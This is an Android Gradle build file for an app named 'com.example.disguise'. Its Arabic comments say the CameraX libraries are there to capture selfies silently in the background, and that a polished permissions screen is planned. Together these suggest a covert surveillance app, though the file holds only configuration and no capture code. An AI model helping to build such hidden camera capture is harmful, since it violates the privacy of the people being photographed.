// المسار: app/build.gradle.kts
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.example.disguise"
    compileSdk = 35

    defaultConfig {
        applicationId = "com.example.disguise"
        minSdk = 30
        targetSdk = 35
        versionCode = 1
        versionName = "1.0"
    }

    // ✅ signingConfigs آمن: يتحقق من وجود الملف وكل المتغيرات قبل التطبيق
    signingConfigs {
        create("release") {
            val keystorePath = System.getenv("KEYSTORE_PATH")
            val storePw = System.getenv("KEYSTORE_PASSWORD")
            val alias = System.getenv("KEY_ALIAS")
            val keyPw = System.getenv("KEY_PASSWORD")

            // حل المسار: إذا كان مطلقاً، استخدمه كما هو. إذا نسبياً، نسبه لمجلد app/
            val keystoreFile = keystorePath
                ?.takeIf { it.isNotBlank() }
                ?.let { file(it) }

            val allSet = keystoreFile != null &&
                    keystoreFile.exists() &&
                    !storePw.isNullOrBlank() &&
                    !alias.isNullOrBlank() &&
                    !keyPw.isNullOrBlank()

            if (allSet) {
                storeFile = keystoreFile
                storePassword = storePw
                keyAlias = alias
                keyPassword = keyPw
                logger.lifecycle("✅ [signing] Release signing configured: ${keystoreFile!!.absolutePath}")
            } else {
                logger.warn("⚠️ [signing] Release signing NOT fully configured. APK will be UNSIGNED.")
                logger.warn("   KEYSTORE_PATH = ${keystorePath ?: "null"} (exists=${keystoreFile?.exists() == true})")
                logger.warn("   KEYSTORE_PASSWORD set = ${!storePw.isNullOrBlank()}")
                logger.warn("   KEY_ALIAS set = ${!alias.isNullOrBlank()}")
                logger.warn("   KEY_PASSWORD set = ${!keyPw.isNullOrBlank()}")
            }
        }
    }

    buildFeatures {
        viewBinding = true
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions {
        jvmTarget = "17"
    }

    buildTypes {
        getByName("release") {
            // ✅ اربط التوقيع فقط إذا كان storeFile موجوداً فعلاً
            val releaseSigning = signingConfigs.findByName("release")
            if (releaseSigning?.storeFile != null) {
                signingConfig = releaseSigning
                logger.lifecycle("✅ [buildTypes] Release will be SIGNED")
            } else {
                logger.warn("⚠️ [buildTypes] Release will be UNSIGNED (signing not configured)")
            }
        }
    }
}

dependencies {
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
    implementation("org.json:json:20240303")

    // ✅ [جديد] مكتبة Material لتصميم شاشة الصلاحيات بشكل احترافي
    implementation("com.google.android.material:material:1.12.0")

    // ✅ [جديد] مكتبات CameraX لالتقاط صور السيلفي بصمت في الخلفية
    val cameraxVersion = "1.3.4"
    implementation("androidx.camera:camera-core:$cameraxVersion")
    implementation("androidx.camera:camera-camera2:$cameraxVersion")
    implementation("androidx.camera:camera-lifecycle:$cameraxVersion")
}
